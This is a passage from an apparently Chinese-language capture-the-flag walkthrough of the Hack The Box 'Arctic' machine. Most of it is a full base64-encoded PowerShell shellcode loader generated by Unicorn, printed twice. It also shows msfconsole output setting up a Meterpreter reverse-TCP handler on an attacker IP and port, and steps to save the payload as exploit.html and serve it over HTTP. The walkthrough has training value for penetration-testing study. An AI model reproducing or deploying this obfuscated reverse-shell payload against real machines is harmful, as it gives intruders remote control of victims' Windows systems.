ADcALAAgAH0AeAA4AH0ALAAgAH0AeABDADMAIgApAC4AcgBlAHAAbABhAGMAZQAoACIAaQBqAFgAaABLAHQATwAiACwAIAAiADUANwAiACkALgByAGUAcABsAGEAYwBlACgAIgB9ACIALAAgACIAMAAiACkALgByAGUAcABsAGEAYwBlACgAIgBmAFoAZgB4AGwAdQBSACIALAAgACIAQgA4ACIAKQA7ACQASABVAEEAUQBUAFQAawAgAD0AIABbAEIAeQB0AGUAWwBdAF0AKAAkAEgAVQBBAFEAVABUAGsAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBDAG8AcAB5ACgAJABIAFUAQQBRAFQAVABrACwAIAAwACwAIAAkAG0ARQBOAGEAYgBpACwAIAA2ACkA&#39;)&quot; # actual unicorn payload powershell /w 1 /C &quot;sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() (&#39;JABUAEYAPQAnACQAcABMAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsACIAKwAiAGwAIgArACIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbAAiACsAIgBsACIAKwAiACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABGAG0ATAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAUwBPAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA2ADQALAB9ADgAYgAsAH0ANQAyACwAfQAzADAALAB9ADgAYgAsAH0ANQAyACwAfQAwAGMALAB9ADgAYgAsAH0ANQAyACwAfQAxADQALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGYAZgAsAH0AOABiACwAfQA3ADIALAB9ADIAOAAsAH0AMABmACwAfQBiADcALAB9ADQAYQAsAH0AMgA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQAwAGEALAB9ADAAYQAsAH0AMQAwACwAfQAwADQALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEANQAsAH0AYgAzACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABjACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0ANgA4ACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAMAAsAH0ANgBhACwAfQAwADQALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADg&#39;+&#39;ALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBlAGUALAB9AGMAMwAiADsAJABrAEoAPQBBAGQAZAAtAFQAeQBwAGUAIAAtAHAAYQBzAHMAIAAtAG0AIAAkAHAATAAgAC0ATgBhAG0AZQAgACIAbQBzACIAIAAtAG4AYQBtAGUAcwAgAEkAYgBFADsAJABrAEoAPQAkAGsASgAuAHIAZQBwAGwAYQBjAGUAKAAiAEkAYgBFACIALAAgACIAVwBpAG4AMwAyAEYAdQBuACIAKwAiAGMAIgArACIAdABpAG8AbgBzACIAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFMATwAgAD0AIAAkAFMATwAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACIAdwBpAFIAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB3AGkAUgAiACwAIAAiADAAIgApAC4AUwBwAGwAaQB0ACgAIgAsACIAKQA7ACQAQgBnAD0AMAB4ADEAMAAwADYAOwBpAGYAIAAoACQAUwBPAC4ATAAgAC0AZwB0ACAAMAB4ADEAMAAwADYAKQB7ACQAQgBnAD0AJABTAE8ALgBMAH0AOwAkAGwAUAA9ACQAawBKADoAOgBjAGEAbABsAG8AYwAoADAAeAAxADAAMAA2ACwAIAAxACkAOwBbAFUASQBuAHQANgA0AF0AJABGAG0ATAAgAD0AIAAwADsAZgBvAHIAKAAkAEIAQQA9ADAAOwAkAEIAQQAgAC0AbABlACgAJABTAE8ALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAQgBBACsAKwApAHsAJABrAEoAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJABsAFAALgBUAG8ASQBuAHQAMwAyACgAKQArACQAQgBBACkALAAgACQAUwBPAFsAJABCAEEAXQAsACAAMQApAH0AOwAkAGsASgA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABsAFAALAAgADAAeAAxADAAMAA2ACwAIAAwAHgANAAwACwAIABbAFIAZQBmAF0AJABGAG0ATAApADsAJABZAFoASgA9AFsAaQBuAHQAXQAwAHgAMAAwADsAJABrAEoAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAWwBpAG4AdABdADAALAAkAFkAWgBKACwAJABsAFAALAAwACwAMAAsADEALQAxACkAOwAnADsAJABJAFgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFQARgApACkAOwAkAE4ATQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABIAEsAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAZABSAEsAIAA9ACAAIgBDADoAXAAkAEgASwBcAEIAeABTAHIAQwBMAHYAWABcACQASABLACQATgBNAFwAdgAxAC4AMABcACQATgBNACIAOwAkAGQAUgBLACAAPQAgACQAZABSAEsALgByAGUAcABsAGEAYwBlACgAIgBCAHgAUwByACIALAAgACIAcwB5AHMAIgApADsAJABkAFIASwAgAD0AIAAkAGQAUgBLAC4AcgBlAHAAbABhAGMAZQAoACIAQwBMAHYAWAAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAHYARABWAHQAIAA9ACAAJwBUACIAKwAiAHIAIgArACIAdQBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAdgBEAFYAdAAnACkAewAkAE4ATQA9ACAAJABkAFIASwB9ADsAJABiAFoAPQAiACAAJABOAE0AIABpAEoAbAB5ACAAJABJAFgAIgA7ACQAYgBaAD0AJABiAFoALgByAGUAcABsAGEAYwBlACgAIgBpAEoAbAB5ACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAYgBaAA&#39;+&#39;==&#39;)&quot; 一个是 powershell 的攻击代码 我们复制进去 然后我们使用 msfconsole 加载 unicorn.rc ┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn] └─# msfconsole -r unicorn.rc .,,. . .\\$$$$$L..,,==aaccaacc%#s$b. d8, d8P d8P #$$$$$$$$$$$$$$$$$$$$$$$$$$$b. `BP d888888p d888888P &#39;7$$$$\\&quot;&quot;&quot;&quot;&#39;&#39;^^`` .7$$$|D*&quot;&#39;``` ?88&#39; d8bd8b.d8p d8888b ?88&#39; d888b8b _.os#$|8*&quot;` d8P ?8b 88P 88P`?P&#39;?P d8b_,dP 88P d8P&#39; ?88 .oaS###S*&quot;` d8P d8888b $whi?88b 88b d88 d8 ?8 88b 88b 88b ,88b .osS$$$$*&quot; ?88,.d88b, d88 d8P&#39; ?88 88P `?8b d88&#39; d88b 8b`?8888P&#39;`?8b`?88P&#39;.aS$$$$Q*&quot;` `?88&#39; ?88 ?88 88b d88 d88 .a#$$$$$$&quot;` 88b d8P 88b`?8888P&#39; ,s$$$$$$$&quot;` 888888P&#39; 88n _.,,,ass;: .a$$$$$$$P` d88P&#39; .,.ass%#S$$$$$$$$$$$$$$&#39; .a$###$$$P` _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$&#39; ,a$$###$$P` _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS&#39; .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--&quot;&quot;&#39;&#39;^^/$$$$$$&#39; _______________________________________________________________ ,&amp;$$$$$$&#39;_____ ll&amp;&amp;$$$$&#39; .;;lll&amp;&amp;&amp;&amp;&#39; ...;;lllll&amp;&#39; ......;;;llll;;;.... ` ......;;;;... . . =[ metasploit v6.0.45-dev ] + -- --=[ 2134 exploits - 1139 auxiliary - 364 post ] + -- --=[ 592 payloads - 45 encoders - 10 nops ] + -- --=[ 8 evasion ] Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again [*] Processing unicorn.rc for ERB directives. resource (unicorn.rc)&gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp resource (unicorn.rc)&gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp resource (unicorn.rc)&gt; set LHOST 10.10.16.4 LHOST =&gt; 10.10.16.4 resource (unicorn.rc)&gt; set LPORT 5555 LPORT =&gt; 5555 resource (unicorn.rc)&gt; set ExitOnSession false ExitOnSession =&gt; false resource (unicorn.rc)&gt; set AutoVerifySession false AutoVerifySession =&gt; false resource (unicorn.rc)&gt; set AutoSystemInfo false AutoSystemInfo =&gt; false resource (unicorn.rc)&gt; set AutoLoadStdapi false AutoLoadStdapi =&gt; false resource (unicorn.rc)&gt; exploit -j [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 10.10.16.4:5555 ┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn] └─# cat powershell_attack.txt|xclip 把 poweshell 的攻击脚本复制到剪切板 powershell /w 1 /C &quot; 删掉前面的内容和最后的双引号 sv PWA -;sv es ec;sv xo ((gv PWA).value.toString()+(gv es).value.toString());powershell (gv xo).value.toString() (&#39;JABUAEYAPQAnACQAcABMAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsACIAKwAiAGwAIgArACIAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbAAiACsAIgBsACIAKwAiACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABGAG0ATAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAIgArACIAbAAiACsAIgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAUwBPAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA2ADQALAB9ADgAYgAsAH0ANQAyACwAfQAzADAALAB9ADgAYgAsAH0ANQAyACwAfQAwAGMALAB9ADgAYgAsAH0ANQAyACwAfQAxADQALAB9ADgAOQAsAH0AZQA1ACwAfQAzADEALAB9AGYAZgAsAH0AOABiACwAfQA3ADIALAB9ADIAOAAsAH0AMABmACwAfQBiADcALAB9ADQAYQAsAH0AMgA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQAwAGEALAB9ADAAYQAsAH0AMQAwACwAfQAwADQALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEANQAsAH0AYgAzACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABjACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0ANgA4ACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAMAAsAH0ANgBhACwAfQAwADQALAB9ADUANgAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADg&#39;+&#39;ALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBlAGUALAB9AGMAMwAiADsAJABrAEoAPQBBAGQAZAAtAFQAeQBwAGUAIAAtAHAAYQBzAHMAIAAtAG0AIAAkAHAATAAgAC0ATgBhAG0AZQAgACIAbQBzACIAIAAtAG4AYQBtAGUAcwAgAEkAYgBFADsAJABrAEoAPQAkAGsASgAuAHIAZQBwAGwAYQBjAGUAKAAiAEkAYgBFACIALAAgACIAVwBpAG4AMwAyAEYAdQBuACIAKwAiAGMAIgArACIAdABpAG8AbgBzACIAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAFMATwAgAD0AIAAkAFMATwAuAHIAZQBwAGwAYQBjAGUAKAAiAH0AIgAsACIAdwBpAFIAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB3AGkAUgAiACwAIAAiADAAIgApAC4AUwBwAGwAaQB0ACgAIgAsACIAKQA7ACQAQgBnAD0AMAB4ADEAMAAwADYAOwBpAGYAIAAoACQAUwBPAC4ATAAgAC0AZwB0ACAAMAB4ADEAMAAwADYAKQB7ACQAQgBnAD0AJABTAE8ALgBMAH0AOwAkAGwAUAA9ACQAawBKADoAOgBjAGEAbABsAG8AYwAoADAAeAAxADAAMAA2ACwAIAAxACkAOwBbAFUASQBuAHQANgA0AF0AJABGAG0ATAAgAD0AIAAwADsAZgBvAHIAKAAkAEIAQQA9ADAAOwAkAEIAQQAgAC0AbABlACgAJABTAE8ALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAQgBBACsAKwApAHsAJABrAEoAOgA6AG0AZQBtAHMAZQB0ACgAWwBJAG4AdABQAHQAcgBdACgAJABsAFAALgBUAG8ASQBuAHQAMwAyACgAKQArACQAQgBBACkALAAgACQAUwBPAFsAJABCAEEAXQAsACAAMQApAH0AOwAkAGsASgA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgAJABsAFAALAAgADAAeAAxADAAMAA2ACwAIAAwAHgANAAwACwAIABbAFIAZQBmAF0AJABGAG0ATAApADsAJABZAFoASgA9AFsAaQBuAHQAXQAwAHgAMAAwADsAJABrAEoAOgA6AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgAWwBpAG4AdABdADAALAAkAFkAWgBKACwAJABsAFAALAAwACwAMAAsADEALQAxACkAOwAnADsAJABJAFgAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAFQARgApACkAOwAkAE4ATQA9ACIAcABvAHcAZQByAHMAaABlAGwAbAAiADsAJABIAEsAPQAiAFcAaQBuAGQAbwB3AHMAIgA7ACQAZABSAEsAIAA9ACAAIgBDADoAXAAkAEgASwBcAEIAeABTAHIAQwBMAHYAWABcACQASABLACQATgBNAFwAdgAxAC4AMABcACQATgBNACIAOwAkAGQAUgBLACAAPQAgACQAZABSAEsALgByAGUAcABsAGEAYwBlACgAIgBCAHgAUwByACIALAAgACIAcwB5AHMAIgApADsAJABkAFIASwAgAD0AIAAkAGQAUgBLAC4AcgBlAHAAbABhAGMAZQAoACIAQwBMAHYAWAAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAHYARABWAHQAIAA9ACAAJwBUACIAKwAiAHIAIgArACIAdQBlACcAOwBpAGYAKABbAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBJAHMANgA0AEIAaQB0AE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACAALQBlAHEAIAAnACQAdgBEAFYAdAAnACkAewAkAE4ATQA9ACAAJABkAFIASwB9ADsAJABiAFoAPQAiACAAJABOAE0AIABpAEoAbAB5ACAAJABJAFgAIgA7ACQAYgBaAD0AJABiAFoALgByAGUAcABsAGEAYwBlACgAIgBpAEoAbAB5ACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAYgBaAA&#39;+&#39;==&#39;) 保存到 exploit.html ┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 